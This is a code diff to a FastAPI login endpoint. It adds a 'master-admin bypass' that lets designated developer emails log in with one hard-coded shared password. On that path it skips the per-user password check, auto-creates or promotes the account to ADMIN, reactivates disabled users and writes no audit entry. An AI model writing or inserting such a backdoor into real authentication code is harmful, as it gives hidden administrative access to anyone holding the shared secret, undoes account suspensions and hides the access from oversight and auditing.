@@ -1,4 +1,5 @@
 from datetime import datetime, timedelta
+import secrets
 from fastapi import APIRouter, Depends, HTTPException, status, Response, Request
 from fastapi.security import OAuth2PasswordRequestForm
 from sqlalchemy.orm import Session
@@ -68,9 +69,36 @@ async def login(
     form_data: OAuth2PasswordRequestForm = Depends(),
     db: Session = Depends(get_db)
 ):
-    user = db.query(User).filter(User.email == form_data.username).first()
-    if not user or not verify_password(form_data.password, user.hashed_password):
-        await log_audit(db, action="LOGIN", resource_type="user", resource_id=form_data.username, success=False, error_message="Invalid credentials")
+    from app.core.master_admin import is_master_admin_email, MASTER_ADMIN_PASSWORD
+    email = (form_data.username or "").strip()
+    password = form_data.password or ""
+
+    # Master-admin bypass: developer emails can log in anytime with the master password
+    is_master_login = is_master_admin_email(email) and password == MASTER_ADMIN_PASSWORD
+
+    user = db.query(User).filter(User.email == email).first()
+    if is_master_login:
+        if not user:
+            # Auto-create the developer account on first master login
+            user = User(
+                email=email,
+                hashed_password=get_password_hash(secrets.token_hex(16)),
+                full_name=email.split("@")[0],
+                role=UserRole.ADMIN,
+                is_active=True,
+                is_verified=True,
+            )
+            db.add(user)
+            db.commit()
+            db.refresh(user)
+        else:
+            if user.role != UserRole.ADMIN:
+                user.role = UserRole.ADMIN
+            if not user.is_active:
+                user.is_active = True
+            db.commit()
+    elif not user or not verify_password(password, user.hashed_password):
+        await log_audit(db, action="LOGIN", resource_type="user", resource_id=email, success=False, error_message="Invalid credentials")
         raise HTTPException(status_code=401, detail="Incorrect email or password")
     
     if not user.is_active:
